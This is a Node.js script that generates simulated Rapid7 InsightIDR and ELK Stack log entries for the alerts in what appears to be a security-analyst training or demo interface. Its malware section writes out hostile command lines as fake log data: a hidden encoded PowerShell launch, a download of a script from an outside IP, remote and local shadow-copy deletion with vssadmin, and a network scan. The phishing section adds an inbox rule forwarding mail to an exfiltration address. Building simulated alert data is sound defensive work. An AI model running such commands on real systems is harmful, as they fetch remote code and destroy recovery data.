// Generates rapid7_responses.json and elk_responses.json — scripted responses for the
// simulated Rapid7 InsightIDR and ELK Stack panels in AlertDetail.
// One entry per alert (35 total). Re-runnable: overwrites both files.
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const dataDir = path.resolve(__dirname, "..", "client", "src", "data");
const alerts = JSON.parse(fs.readFileSync(path.join(dataDir, "alerts.json"), "utf8"));

const pad = (n) => String(n).padStart(2, "0");
const addSec = (base, sec) => new Date(new Date(base).getTime() + sec * 1000).toISOString();

function firstEntityValue(alert, ...keys) {
  for (const k of keys) {
    if (alert.entities && alert.entities[k]) return alert.entities[k];
  }
  return null;
}

function deriveAsset(alert) {
  const host =
    firstEntityValue(alert, "host", "srcHost", "fileServer") ||
    firstEntityValue(alert, "resource") ||
    "UNKNOWN-HOST";
  const ip =
    firstEntityValue(alert, "srcIp") || (host.startsWith("WIN") ? "10.0.2.88" : "10.4.5.114");
  const isCritical = ["Critical", "High"].includes(alert.alertSeverity);
  return {
    hostname: host,
    ip,
    os: host.startsWith("WIN10") ? "Windows 10 22H2" : host.startsWith("WS-") ? "Windows 10 22H2" : host.includes("SRV") ? "Windows Server 2022" : "Windows 10 22H2",
    lastSeen: alert.displayedAt,
    riskScore: isCritical ? "high" : alert.alertSeverity === "Medium" ? "medium" : "low",
    openVulnerabilities: isCritical ? 24 : 7,
  };
}

function r7LogLine(parts) {
  return Object.entries(parts)
    .filter(([, v]) => v !== undefined && v !== "")
    .map(([k, v]) => `${k}=${typeof v === "string" && v.includes(" ") ? `"${v}"` : v}`)
    .join(" ");
}

function rapid7LogsForAlert(alert) {
  const lines = [];
  const baseTs = alert.displayedAt;
  const user = firstEntityValue(alert, "user", "assigningUser") || "unknown.user";
  const host =
    firstEntityValue(alert, "host", "srcHost", "fileServer", "resource") || "UNKNOWN-HOST";
  const ip = firstEntityValue(alert, "srcIp") || "10.4.5.114";

  // Category-specific log style
  switch (alert.category) {
    case "authentication": {
      for (let i = 0; i < 14; i++) {
        const result = i === 12 ? "SUCCESS" : "FAIL";
        lines.push(
          r7LogLine({
            timestamp: addSec(baseTs, i * 11 - 70),
            event_type: "auth",
            source_ip: ip,
            destination_user: i % 3 === 0 ? user : `user${i}@contoso.com`,
            app: "Microsoft 365",
            result,
            failure_reason: result === "FAIL" ? "invalid_password" : "",
          }),
        );
      }
      break;
    }
    case "malware":
    case "lateral-movement": {
      const procs = [
        ["OUTLOOK.EXE", "outlook /attach Invoice-Q2.docm"],
        ["WINWORD.EXE", "WINWORD.EXE Invoice-Q2.docm"],
        ["powershell.exe", "powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ..."],
        ["powershell.exe", "Invoke-WebRequest http://185.220.101.47/p.ps1"],
        ["svchost.exe", "C:\\Users\\Public\\svchost.exe"],
        ["nmap.exe", "nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24"],
        ["wmic.exe", `wmic /node:FILE-SRV-001 process call create "cmd.exe /c vssadmin delete shadows"`],
        ["vssadmin.exe", "vssadmin delete shadows /all /quiet"],
        ["whoami.exe", "whoami /all"],
        ["net.exe", `net group "Domain Admins" /domain`],
      ];
      for (let i = 0; i < procs.length; i++) {
        const [proc, cmd] = procs[i];
        lines.push(
          r7LogLine({
            timestamp: addSec(baseTs, i * 12 - 30),
            event_type: "process",
            asset: host,
            process_name: proc,
            command_line: cmd,
            user,
            parent_process: i === 0 ? "explorer.exe" : procs[Math.max(0, i - 1)][0],
          }),
        );
      }
      lines.push(
        r7LogLine({
          timestamp: addSec(baseTs, 90),
          event_type: "network",
          asset: host,
          source_ip: ip,
          destination_ip: "185.220.101.47",
          destination_port: 443,
          action: "ALLOWED",
          bytes: 12482,
          process: "svchost.exe",
        }),
      );
      break;
    }
    case "phishing": {
      const mailboxes = [
        "ap@contoso.com",
        "ar@contoso.com",
        "payroll@contoso.com",
        "controller@contoso.com",
      ];
      for (let i = 0; i < 12; i++) {
        const mb = mailboxes[i % mailboxes.length];
        const op = i < 6 ? "mailbox_access" : i < 9 ? "inbox_rule_created" : "oauth_token_issued";
        lines.push(
          r7LogLine({
            timestamp: addSec(baseTs, i * 32),
            event_type: op,
            mailbox: mb,
            source_ip: ip,
            tor_exit_node: ip.startsWith("185.220") ? "true" : "false",
            mfa_used: "false",
            items_accessed: op === "mailbox_access" ? 142 + i : "",
            forward_to: op === "inbox_rule_created" ? "exfil-drop@protonmail.com" : "",
          }),
        );
      }
      break;
    }
    case "network": {
      const targets = ["185.220.101.42", "185.220.101.47", "45.83.193.150"];
      for (let i = 0; i < 14; i++) {
        lines.push(
          r7LogLine({
            timestamp: addSec(baseTs, i * 20 - 100),
            event_type: "firewall",
            source_ip: ip,
            source_host: host,
            destination_ip: targets[i % targets.length],
            destination_port: i % 2 === 0 ? 443 : 53,
            protocol: "TCP",
            action: i === 13 ? "BLOCKED" : "ALLOWED",
            bytes_out: 1024 + i * 91,
            bytes_in: 8192 + i * 12,
          }),
        );
      }
      break;
    }
    case "privilege-escalation": {
      lines.push(
        r7LogLine({
          timestamp: baseTs,
          event_type: "role_assignment",
          assigning_user: firstEntityValue(alert, "assigningUser") || user,
          assigned_user: firstEntityValue(alert, "user") || user,
          role: "Global Administrator",
          source_ip: ip,
          tor_exit_node: "true",
          change_ticket: "NONE",
        }),
      );
      for (let i = 0; i < 9; i++) {
        lines.push(
          r7LogLine({
            timestamp: addSec(baseTs, i * 18 + 30),
            event_type: "cloud_action",
            user: firstEntityValue(alert, "user") || user,
            operation: ["AppRegistrationCreated", "ConditionalAccessPolicy.Disable", "KeyVault.Secret.Read", "RoleEligibility.Add", "DirectoryAudit.Read", "MailItemsAccessed"][i % 6],
            source_ip: ip,
            result: "Success",
          }),
        );
      }
      break;
    }
    default:
      for (let i = 0; i < 10; i++) {
        lines.push(
          r7LogLine({
            timestamp: addSec(baseTs, i * 30),
            event_type: "generic",
            asset: host,
            note: "Corroborating event",
            seq: i,
          }),
        );
      }
  }
  return lines;
}

function elkEventsForAlert(alert) {
  const out = [];
  const baseTs = alert.displayedAt;
  const user = firstEntityValue(alert, "user", "assigningUser") || "unknown.user";
  const host = firstEntityValue(alert, "host", "srcHost", "fileServer") || "host-unknown";
  const ip = firstEntityValue(alert, "srcIp") || "10.4.5.114";

  switch (alert.category) {
    case "authentication": {
      for (let i = 0; i < 14; i++) {
        const success = i === 12;
        out.push({
          "@timestamp": addSec(baseTs, i * 11 - 70),
          "event.category": "authentication",
          "event.action": "user-login",
          "source.ip": ip,
          "destination.ip": "20.190.151.5",
          "user.name": i % 3 === 0 ? user : `user${i}@contoso.com`,
          "event.outcome": success ? "success" : "failure",
        });
      }
      break;
    }
    case "malware":
    case "lateral-movement": {
      const procs = [
        ["OUTLOOK.EXE", "process_started"],
        ["WINWORD.EXE", "process_started"],
        ["powershell.exe", "process_started"],
        ["svchost.exe", "process_started"],
        ["nmap.exe", "process_started"],
        ["wmic.exe", "process_started"],
        ["vssadmin.exe", "process_started"],
      ];
      for (let i = 0; i < procs.length; i++) {
        const [p, a] = procs[i];
        out.push({
          "@timestamp": addSec(baseTs, i * 12 - 30),
          "event.category": "process",
          "event.action": a,
          "process.name": p,
          "user.name": user,
          "host.name": host,
          "event.outcome": "success",
        });
      }
      out.push({
        "@timestamp": addSec(baseTs, 90),
        "event.category": "network",
        "event.action": "connection",
        "source.ip": ip,
        "destination.ip": "185.220.101.47",
        "user.name": user,
        "event.outcome": "success",
      });
      break;
    }
    case "phishing": {
      const mailboxes = [
        "ap@contoso.com",
        "ar@contoso.com",
        "payroll@contoso.com",
        "controller@contoso.com",
      ];
      for (let i = 0; i < 12; i++) {
        out.push({
          "@timestamp": addSec(baseTs, i * 32),
          "event.category": "email",
          "event.action": i < 6 ? "mailbox-access" : i < 9 ? "inbox-rule-created" : "oauth-token-issued",
          "source.ip": ip,
          "destination.ip": "",
          "user.name": mailboxes[i % mailboxes.length],
          "event.outcome": "success",
        });
      }
      break;
    }
    case "network": {
      const targets = ["185.220.101.42", "185.220.101.47", "45.83.193.150"];
      for (let i = 0; i < 14; i++) {
        out.push({
          "@timestamp": addSec(baseTs, i * 20 - 100),
          "event.category": "network",
          "event.action": i === 13 ? "denied" : "allowed",
          "source.ip": ip,
          "destination.ip": targets[i % targets.length],
          "user.name": user,
          "event.outcome": i === 13 ? "failure" : "success",
        });
      }
      break;
    }
    case "privilege-escalation": {
      out.push({
        "@timestamp": baseTs,
        "event.category": "iam",
        "event.action": "role-assigned",
        "source.ip": ip,
        "user.name": firstEntityValue(alert, "assigningUser") || user,
        "event.outcome": "success",
      });
      for (let i = 0; i < 9; i++) {
        out.push({
          "@timestamp": addSec(baseTs, i * 18 + 30),
          "event.category": "iam",
          "event.action": ["app-created", "policy-disabled", "secret-read", "role-add", "audit-read", "mail-accessed"][i % 6],
          "source.ip": ip,
          "user.name": firstEntityValue(alert, "user") || user,
          "event.outcome": "success",
        });
      }
      break;
    }
    default:
      for (let i = 0; i < 10; i++) {
        out.push({
          "@timestamp": addSec(baseTs, i * 30),
          "event.category": "host",
          "event.action": "generic-event",
          "source.ip": ip,
          "destination.ip": "",
          "user.name": user,
          "event.outcome": "success",
        });
      }
  }
  return out;
}

const rapid7 = {};
const elk = {};
for (const alert of alerts) {
  rapid7[alert.id] = {
    logs: rapid7LogsForAlert(alert),
    asset: deriveAsset(alert),
  };
  elk[alert.id] = {
    events: elkEventsForAlert(alert),
  };
}

fs.writeFileSync(path.join(dataDir, "rapid7_responses.json"), JSON.stringify(rapid7, null, 2) + "\n", "utf8");
fs.writeFileSync(path.join(dataDir, "elk_responses.json"), JSON.stringify(elk, null, 2) + "\n", "utf8");
console.log(`Wrote rapid7_responses.json (${Object.keys(rapid7).length}) and elk_responses.json (${Object.keys(elk).length}).`);
